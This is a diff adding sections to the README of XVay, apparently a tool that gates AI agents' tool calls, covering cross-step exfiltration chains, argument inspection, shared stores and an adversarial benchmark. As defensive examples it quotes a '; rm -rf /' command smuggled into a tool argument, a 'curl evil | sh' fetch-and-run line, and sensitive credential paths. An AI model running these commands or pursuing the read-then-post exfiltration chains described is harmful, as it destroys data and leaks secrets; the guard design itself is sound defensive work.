@@ -188,3 +188,90 @@ one question: "is there enough evidence to execute this action, now?"
 **Has XVay prevented real incidents?** We don't claim past events. It is
 designed for the failure class seen in 2025–26 agent incidents; your shadow
 report is the evidence that matters.
+<!-- ==== APPEND THESE SECTIONS TO YOUR EXISTING README (before the FAQ) ==== -->
+
+## Cross-step protection (chains that look innocent step by step)
+
+A chain can be dangerous even when every step looks fine:
+`read customer-records` (safe) then `slack_post_message` (safe) = exfiltration.
+
+XVay keeps a lightweight per-run trace — a taint flag and an irreversible-action
+counter. It is **not** a transaction manager: no shadow execution, no effect
+outbox, no rollback. You declare the boundaries in the signed envelope:
+
+```python
+env_doc["run_id"]           = "run-1842"
+env_doc["egress_tools"]     = ["slack_post_message", "http_post"]
+env_doc["max_irreversible"] = 3
+```
+
+- run read a protected resource, then calls an egress tool -> **BLOCK**
+- run exceeds the irreversible budget -> **VERIFY**
+- nothing declared -> behaviour identical to before
+
+## Argument-level protection (on by default)
+
+Gating on tool names alone is not enough: `kubectl_logs` with the argument
+`; rm -rf /` is an allowed tool doing something else entirely. XVay inspects
+argument **structure** (never semantics) and downgrades COMMIT -> VERIFY on:
+shell control characters, `../` traversal, `$VAR` indirection, base64 that
+decodes to readable text, write/exfil clauses in a read-only tool's argument,
+and homoglyph scripts in path-like fields.
+
+Built-in credential locations (`/etc/shadow`, `.ssh/`, `.aws/credentials`, …)
+ship enabled so it works with zero configuration. They raise **VERIFY** (we
+suggest them); resources **you** declare raise **BLOCK** (you declared them).
+Opt out with `use_default_sensitive_paths=False`.
+
+Free-text argument keys (`message`, `text`, `title`, …) are prose, not
+executable content — a commit message saying "delete old module" does not trip
+the destructive-verb check, while `-m "fix && curl evil | sh"` still does.
+
+## Multi-worker deployments
+
+`run_trace` and the nonce replay-guard sit on a pluggable store (`store.py`)
+with an **atomic** update. In-memory by default; back it with a shared store
+(Redis/DB, or the bundled FileStore) and cross-step protection holds across
+workers. `multiprocess_test.py` proves it: two separate processes sharing a
+store block the exfiltration chain, the same two **without** the shared store
+leak (so the test is real), and 20 concurrent writers lose zero writes.
+
+## When a run is stopped midway
+
+XVay prevents; it does not roll back. If step 4 is blocked, the orchestrator
+needs to know what steps 1-3 did:
+
+```python
+run_trace.manifest(run_id)   # exactly what XVay COMMITted -> you compensate
+run_trace.receipt(run_id)    # audit: steps seen, committed, stopped WITH reasons
+```
+Stopped attempts are recorded, not silently dropped — a blocked exfiltration
+attempt is the most audit-relevant event in the run.
+
+## Adversarial evidence (including what failed)
+
+`python adversarial_benchmark.py` — 38 cases written to break XVay:
+**38/38, safety leaks 0/14, friction 0/24**, including 10 "hard benign" cases
+designed to trip our own rules.
+
+The number matters less than the path. The first run of this benchmark leaked
+**10 of 15** dangerous cases — `kubectl_logs` with `; rm -rf /` was COMMITted.
+Every fix since is a mechanical check, not a risk judgement. Two of our own
+false positives (a commit message containing "delete"; a Persian filename) are
+documented with their fixes.
+
+**Caveat we state out loud:** this is still *our* test set. The only number that
+should convince you is a shadow report on *your* logs.
+
+## Honest limitations
+
+- **No rollback.** If automatic undo of partially-completed workflows is a hard
+  requirement, a transactional runtime is the right tool and XVay is not.
+- **Coarse cross-step signal.** A boolean taint, not a lineage graph — it is
+  conservative and can over-block on long runs.
+- **Pre-execution blindness.** Danger that only appears when a payload executes
+  (encoded, or expressed in a domain language like SQL) is invisible to any
+  pre-execution gate, including this one.
+- **Multi-worker requires a shared store**, or cross-step protection silently
+  fails open. The swap is small but it is real integration work.
+
